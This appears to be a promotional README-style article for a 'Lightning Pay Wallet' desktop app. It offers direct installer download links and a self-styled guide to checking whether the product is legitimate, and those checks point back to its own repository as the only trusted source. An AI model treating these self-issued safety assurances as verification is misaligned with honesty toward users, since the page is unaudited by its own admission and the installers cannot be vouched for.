<p align="center"><img src="assets/banner-article.png" alt="Lightning Pay Wallet"></p>

# Is Lightning Pay legit and safe? What the record actually shows

Check the download route, the licence, the code and the custody model instead of trusting a review.

<p align="center"><a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-windows-v1.2.1.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-0350c2?style=for-the-badge&logo=data:image/svg%2Bxml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=ffffff&labelColor=091640" alt="DOWNLOAD Windows"></a> <a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-macos-v1.2.1.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-0350c2?style=for-the-badge&logo=apple&logoColor=ffffff&labelColor=091640" alt="DOWNLOAD macOS"></a> <a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-linux-v1.2.1.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-0350c2?style=for-the-badge&logo=linux&logoColor=ffffff&labelColor=091640" alt="DOWNLOAD Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| ![Windows](https://img.shields.io/badge/platform-Windows-fed023?style=flat-square&logo=data:image/svg%2Bxml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=ffffff&labelColor=091640) | Windows 10 (1909) or later, 64-bit | <a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-windows-v1.2.1.exe">lightning-pay-wallet-windows-v1.2.1.exe</a> |
| ![macOS](https://img.shields.io/badge/platform-macOS-fed023?style=flat-square&logo=apple&logoColor=ffffff&labelColor=091640) | macOS 12 or later | <a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-macos-v1.2.1.dmg">lightning-pay-wallet-macos-v1.2.1.dmg</a> |
| ![Linux](https://img.shields.io/badge/platform-Linux-fed023?style=flat-square&logo=linux&logoColor=ffffff&labelColor=091640) | x64, Ubuntu 20.04 or later, or equivalent | <a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-linux-v1.2.1.zip">lightning-pay-wallet-linux-v1.2.1.zip</a> |

</div>

Every file above is published on <a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/tag/v1.2.1">the Lightning Pay Wallet release page</a> under the same names, and that page is the only place the installers should come from.

> **Only download from this GitHub release page.**

"Legit" is a question about provenance, not about vibes, and it can be answered by checking four
things. None of them require trusting this page.

## Check the download route

The only official installers are the files attached to the release on the app repository, which is
linked from every page here. A download served from anywhere else, including an ad, a mirror or a
"fast download" button, is not this product.

The check is mechanical: the link should point at
`github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases`. If it does not, stop.

## Check the licence and the code

The application's repository carries the project's source and its licence. That does not mean every
line has been audited by a third party, and this page will not pretend it has. What it means is that
the code can be read, the release history is public, and the build is not a black box distributed by
an anonymous site.

"Open source" is a claim about access, not a promise of safety. Treat it as one input among several.

## Check the custody model

The wallet is non-custodial: keys are generated and held on your machine, and no server holds a
balance. That is a real safety property, because it means no company can freeze the funds, and a real
responsibility, because it means nobody can recover them for you either.

If a wallet asks for an email and a password before showing a balance, it is custodial, whatever its
marketing says. <a href="https://github.com/bitcoin-lightning-wallet/wallet-recovery-guides/blob/HEAD/custodial-vs-non-custodial-wallet.md">Custodial vs non-custodial</a>
covers the trade.

## Check what people actually report

Search results for this name mix several products, and some reviews describe the card product rather
than the desktop wallet. Reddit threads repeat both. The useful filter is the repository: issues,
release notes and commit history describe the software that exists.

That is a weaker signal than an audit and a stronger one than a review site with affiliate links.

## What would make it not legit

A download that does not come from the release page. A build that asks for a seed phrase to "verify"
it. A support channel that requests remote access. A site that promises returns. Any of those means
stop, regardless of the name on the page.

## Questions people ask

### Is it safe to install?

Install from the release page and check that the file names match the ones published there. The
installer is the same artefact for everyone.

### Is the code audited?

It is public and reviewable. No independent audit of this build is claimed here.

### Why do reviews mention a card?

Because several products share the name. The card belongs to a different product line.

## Related guides

- <a href="https://github.com/bitcoin-lightning-wallet/wallet-recovery-guides/blob/HEAD/fake-lightning-pay-site.md">Spotting a fake Lightning Pay website or installer</a>
- <a href="https://github.com/bitcoin-lightning-wallet/wallet-recovery-guides/blob/HEAD/what-lightning-pay-wallet-is.md">What Lightning Pay Wallet is, and what it is not</a>

